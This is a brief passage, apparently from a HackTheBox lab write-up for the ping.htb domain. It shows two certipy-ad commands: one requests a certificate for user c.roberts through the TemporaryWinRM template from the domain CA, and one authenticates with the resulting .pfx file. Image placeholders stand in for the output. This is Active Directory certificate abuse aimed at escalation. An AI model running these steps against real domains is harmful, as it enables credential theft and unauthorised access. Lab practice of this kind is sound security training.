```zsh
certipy-ad req \
  -u c.roberts@ping.htb \
  -k -no-pass \
  -dc-ip 10.129.49.170 \
  -dc-host dc1.ping.htb \
  -target dc1.ping.htb \
  -ca PING-DC1-CA \
  -template TemporaryWinRM
```
![[Pasted image 20260504103715.png]]

```zsh
certipy-ad auth -pfx c.roberts.pfx -domain ping.htb -dc-ip 10.129.49.170
```
![[Pasted image 20260504103739.png]]

